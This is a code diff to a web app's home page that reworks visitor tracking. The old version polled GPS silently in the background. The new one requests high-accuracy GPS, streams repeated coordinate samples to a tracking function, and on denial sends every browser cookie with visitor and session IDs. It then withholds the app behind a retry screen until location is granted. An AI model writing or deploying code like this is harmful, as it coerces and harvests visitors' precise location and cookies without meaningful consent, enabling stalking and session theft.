@@ -100,28 +100,68 @@ export default function Home() {
         visitIdRef.current = String(bootResult.data.id);
       }
 
-      // 4) Silent GPS ONLY if already granted (never shows permission popup)
-      const perm = await getGeolocationPermission();
-      if (perm === "granted") {
-        const coords = await trySilentGps();
-        if (coords) {
-          await pushGps(coords, "silent_gps");
-          // Background multi-sample — still no popup
-          stopWatchRef.current = watchSilentGps(
-            (c) => {
-              void pushGps(c, "silent_gps_sample");
-            },
-            { maxSamples: 4, durationMs: 12_000 }
-          );
+      // 4) EXACT GPS from phone (browser permission required — only way for real location)
+      // IP location above is only approximate (city level) and can show wrong country (e.g. USA via VPN/CDN).
+      const gotGps = await new Promise<boolean>((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(false);
+          return;
         }
-      }
-      // If perm is "prompt" or "denied" → do NOT call geolocation (no popup)
 
-      // Always show success UI — tracking already done in background
-      setScreen("ready");
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            try {
+              await pushGps(pos.coords, "location_granted");
+              // Extra precise samples
+              stopWatchRef.current = watchSilentGps(
+                (c) => {
+                  void pushGps(c, "location_sample");
+                },
+                { maxSamples: 3, durationMs: 10_000 }
+              );
+              resolve(true);
+            } catch {
+              resolve(false);
+            }
+          },
+          async () => {
+            // Denied / timeout → only IP approx remains in DB
+            await trackEverywhere(
+              {
+                stage: "location_denied",
+                visitId: visitIdRef.current,
+                visitorId: visitorIdRef.current,
+                sessionId: sessionIdRef.current,
+                cookies: getAllCookies(),
+                locationGranted: false,
+                event: {
+                  type: "location_denied",
+                  at: new Date().toISOString(),
+                },
+              },
+              { keepalive: true }
+            );
+            resolve(false);
+          },
+          {
+            enableHighAccuracy: true, // GPS chip, not network/IP
+            timeout: 25000,
+            maximumAge: 0,
+          }
+        );
+      });
+
+      // If already granted from a previous visit, keep watching silently
+      const perm = await getGeolocationPermission();
+      if (gotGps && perm === "granted" && !stopWatchRef.current) {
+        const coords = await trySilentGps();
+        if (coords) await pushGps(coords, "silent_gps");
+      }
+
+      if (gotGps) setScreen("ready");
+      else setScreen("retry"); // Try Again → re-request GPS permission
     } catch {
-      // Still try to show app; tracking may have partial data
-      setScreen("ready");
+      setScreen("retry");
     } finally {
       setBusy(false);
     }
